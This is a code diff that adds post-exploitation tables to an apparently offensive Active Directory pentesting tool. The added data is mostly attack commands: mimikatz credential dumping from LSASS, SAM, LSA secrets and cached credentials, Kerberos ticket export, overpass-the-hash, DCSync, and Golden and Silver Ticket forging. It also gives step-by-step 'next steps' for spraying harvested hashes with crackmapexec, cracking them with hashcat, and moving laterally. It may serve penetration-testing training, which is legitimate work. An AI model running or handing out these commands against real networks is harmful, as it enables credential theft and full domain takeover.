@@ -1775,3 +1775,248 @@ def get_authenticated_attacks(priority: Optional[str] = None) -> List[Dict[str, 
     if priority is None:
         return AUTHENTICATED_ATTACKS
     return [a for a in AUTHENTICATED_ATTACKS if a.get("priority") == priority]
+
+
+# =============================================================================
+# POST-EXPLOITATION COMMANDS (after landing with local admin)
+# =============================================================================
+
+# Credential harvest commands organized by privilege level
+# Shown after --pwn when user has local-admin access
+POST_EXPLOITATION_COMMANDS: Dict[str, Dict[str, List[tuple]]] = {
+    "local-admin": {
+        "immediate": [
+            ("mimikatz-privilege-debug", "Verify admin rights", "privilege::debug"),
+            ("mimikatz-token-elevate", "Elevate to SYSTEM token", "token::elevate"),
+        ],
+        "credential_harvest": [
+            ("mimikatz-sekurlsa-logonpasswords", "1. Active sessions - PRIORITY!", "sekurlsa::logonpasswords", "high"),
+            ("mimikatz-sekurlsa-tickets-export", "2. Kerberos tickets", "sekurlsa::tickets /export", "high"),
+            ("mimikatz-lsadump-sam", "3. Local account hashes", "lsadump::sam", "medium"),
+            ("mimikatz-lsadump-secrets", "4. Service account passwords", "lsadump::secrets", "medium"),
+            ("mimikatz-lsadump-cache", "5. Cached domain credentials", "lsadump::cache", "low"),
+        ],
+        "with_sessions": [
+            ("mimikatz-sekurlsa-logonpasswords", "HIGH PRIORITY - DA sessions detected!", "sekurlsa::logonpasswords"),
+            ("mimikatz-sekurlsa-tickets-export", "Export DA TGT for Pass-the-Ticket", "sekurlsa::tickets /export"),
+        ],
+        "with_harvested_hash": [
+            ("mimikatz-overpass-the-hash", "Convert NTLM to Kerberos ticket", "sekurlsa::pth"),
+            ("ad-silver-ticket-mimikatz-create", "Forge service ticket", "kerberos::golden /service"),
+        ],
+    },
+    "domain-admin": {
+        "remote_preferred": [
+            ("ad-dcsync-impacket-secretsdump-user", "Remote DCSync (safer)", "secretsdump.py"),
+            ("mimikatz-dcsync-all", "DCSync all accounts", "lsadump::dcsync /all"),
+        ],
+        "persistence": [
+            ("ad-golden-ticket-mimikatz-create", "Golden Ticket for persistence", "kerberos::golden"),
+        ],
+        "on_dc": [
+            ("ad-golden-ticket-lsa-dump-krbtgt", "Full NTDS extraction (on DC only)", "lsadump::lsa /patch"),
+        ],
+    },
+    "user-level": {
+        "limited": [
+            ("mimikatz-kerberos-list", "View own Kerberos tickets", "kerberos::list"),
+        ],
+        "privesc_check": [
+            ("winpeas", "Check for local privilege escalation", "winPEAS.exe"),
+        ],
+    },
+}
+
+# Educational tips for credential harvesting - what to look for and next steps
+HARVEST_TIPS: Dict[str, Dict[str, List[str]]] = {
+    "sekurlsa::logonpasswords": {
+        "what_to_look_for": [
+            "NTLM hash (32 hex chars) - usable for Pass-the-Hash",
+            "Cleartext password - if wdigest enabled (older systems)",
+            "Domain\\Username pairs - identify high-value accounts",
+            "Multiple entries = multiple logged-in users (jackpot!)",
+        ],
+        "next_steps": [
+            "Found DA hash? -> DCSync immediately: secretsdump.py",
+            "Found service account? -> Check SPNs for Silver Ticket",
+            "Found local admin? -> Spray hash: crackmapexec smb <targets> -H <hash>",
+            "Cleartext password? -> Try password reuse on other accounts",
+        ],
+    },
+    "sekurlsa::tickets": {
+        "what_to_look_for": [
+            "krbtgt tickets (TGT) - most valuable, reusable",
+            "Service tickets (TGS) - limited to specific service",
+            "Ticket expiration time - ensure not expired",
+            "Encryption type - RC4 vs AES (AES = modern, stealthier)",
+        ],
+        "next_steps": [
+            "Export TGT: sekurlsa::tickets /export",
+            "Inject on attacker box: kerberos::ptt <ticket.kirbi>",
+            "Use for lateral movement without knowing password",
+            "DA TGT = domain-wide access via Kerberos auth",
+        ],
+    },
+    "lsadump::sam": {
+        "what_to_look_for": [
+            "Local Administrator hash - often reused across machines!",
+            "RID 500 = built-in Administrator (even if renamed)",
+            "Other local accounts - may have weak passwords",
+            "Compare hashes across machines for reuse",
+        ],
+        "next_steps": [
+            "Crack: hashcat -m 1000 hash.txt rockyou.txt",
+            "Spray: crackmapexec smb <targets> -H <hash> --local-auth",
+            "Same hash on multiple machines = password reuse = pivot!",
+            "Add to credential database for future spray attacks",
+        ],
+    },
+    "lsadump::secrets": {
+        "what_to_look_for": [
+            "Service account passwords (often in cleartext!)",
+            "DPAPI master keys - decrypt saved credentials",
+            "Machine account password - rarely useful but document",
+            "Scheduled task credentials - may be domain accounts",
+        ],
+        "next_steps": [
+            "Service account found? -> Check if DA or high-privilege",
+            "Use for lateral movement if service runs on other boxes",
+            "Check SPNs: setspn -L <service_account>",
+            "May enable Kerberoasting bypass (already have password)",
+        ],
+    },
+    "lsadump::cache": {
+        "what_to_look_for": [
+            "DCC2 hashes - cached domain credentials",
+            "Format: $DCC2$<iterations>$<username>$<hash>",
+            "User accounts that logged in while DC unreachable",
+            "May contain DA creds if DA logged in offline",
+        ],
+        "next_steps": [
+            "Crack: hashcat -m 2100 dcc2.txt rockyou.txt",
+            "DCC2 is SLOW to crack (~10x slower than NTLM)",
+            "Prioritize high-value accounts (admin, service)",
+            "Use rules: -r best64.rule for efficiency",
+        ],
+    },
+    "overpass_the_hash": {
+        "what_to_look_for": [
+            "New cmd.exe window spawns with Kerberos context",
+            "klist shows TGT for target user",
+            "Can now use Kerberos auth (hostname required, not IP)",
+        ],
+        "next_steps": [
+            "Access resources using hostname: dir \\\\DC01\\C$",
+            "DO NOT use IP addresses (forces NTLM, bypasses ticket)",
+            "Chain with other Kerberos attacks: Silver/Golden tickets",
+        ],
+    },
+}
+
+# Argument acquisition hints - how to obtain critical placeholders
+ARG_ACQUISITION: Dict[str, Dict[str, Any]] = {
+    "<SID>": {
+        "description": "Domain Security Identifier (without user RID)",
+        "quick_commands": [
+            "whoami /user  # Remove last segment after final hyphen",
+            "Get-ADDomain | Select DomainSID  # PowerShell",
+            "lookupsid.py 'DOMAIN/user:pass'@DC_IP  # Impacket",
+        ],
+        "example": "S-1-5-21-1987370270-658905905-1781884369",
+        "common_mistake": "Don't include user RID (the -1105 at the end)",
+    },
+    "<KRBTGT_HASH>": {
+        "description": "NTLM hash of krbtgt account (32 hex chars)",
+        "quick_commands": [
+            "secretsdump.py -just-dc-user krbtgt 'DOMAIN/DA:pass'@DC_IP",
+            "mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt",
+        ],
+        "requires": "Domain Admin or DCSync rights",
+        "example": "1693c6cefafffc7af11ef34d1c788f47",
+    },
+    "<DOMAIN>": {
+        "description": "Domain FQDN (not NetBIOS)",
+        "quick_commands": [
+            "echo %userdnsdomain%  # Windows CMD",
+            "$env:USERDNSDOMAIN  # PowerShell",
+            "Get-ADDomain | Select DNSRoot  # PowerShell AD",
+        ],
+        "example": "corp.com",
+        "common_mistake": "Use FQDN (corp.com) not NetBIOS (CORP)",
+    },
+    "<DC_IP>": {
+        "description": "Domain Controller IP address",
+        "quick_commands": [
+            "nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN",
+            "nltest /dclist:DOMAIN  # Windows",
+            "echo %LOGONSERVER%  # Current DC",
+        ],
+        "example": "10.0.0.1",
+    },
+    "<SERVICE_HASH>": {
+        "description": "NTLM hash of service account (for Silver Ticket)",
+        "quick_commands": [
+            "# Kerberoast then crack:",
+            "GetUserSPNs.py -request 'DOMAIN/user:pass' -dc-ip DC_IP",
+            "hashcat -m 13100 tgs.txt rockyou.txt",
+            "# Or from LSASS if service logged in:",
+            "sekurlsa::logonpasswords",
+        ],
+        "requires": "Any domain user (Kerberoast) or local admin (LSASS)",
+    },
+    "<TARGET_SPN>": {
+        "description": "Service Principal Name (service/hostname)",
+        "quick_commands": [
+            "setspn -Q */<hostname>*  # Find SPNs on target",
+            "setspn -L <service_account>  # List account's SPNs",
+        ],
+        "example": "cifs/files04.corp.com, http/web01.corp.com",
+    },
+}
+
+
+def get_post_exploit_commands(privilege_level: str, category: Optional[str] = None) -> List[tuple]:
+    """
+    Get post-exploitation commands for a given privilege level.
+
+    Args:
+        privilege_level: local-admin, domain-admin, or user-level
+        category: Optional category filter (immediate, credential_harvest, etc.)
+
+    Returns:
+        List of command tuples (id, description, command, [priority])
+    """
+    level_commands = POST_EXPLOITATION_COMMANDS.get(privilege_level, {})
+    if category:
+        return level_commands.get(category, [])
+    # Return all commands for this level
+    all_commands = []
+    for cat_commands in level_commands.values():
+        all_commands.extend(cat_commands)
+    return all_commands
+
+
+def get_harvest_tips(command_key: str) -> Dict[str, List[str]]:
+    """
+    Get educational tips for a credential harvest command.
+
+    Args:
+        command_key: The mimikatz module (e.g., sekurlsa::logonpasswords)
+
+    Returns:
+        Dict with 'what_to_look_for' and 'next_steps' lists
+    """
+    return HARVEST_TIPS.get(command_key, {"what_to_look_for": [], "next_steps": []})
+
+
+def get_arg_acquisition(placeholder: str) -> Dict[str, Any]:
+    """
+    Get acquisition hints for a command placeholder.
+
+    Args:
+        placeholder: The placeholder (e.g., <SID>, <KRBTGT_HASH>)
+
+    Returns:
+        Dict with description, quick_commands, example, etc.
+    """
+    return ARG_ACQUISITION.get(placeholder, {})
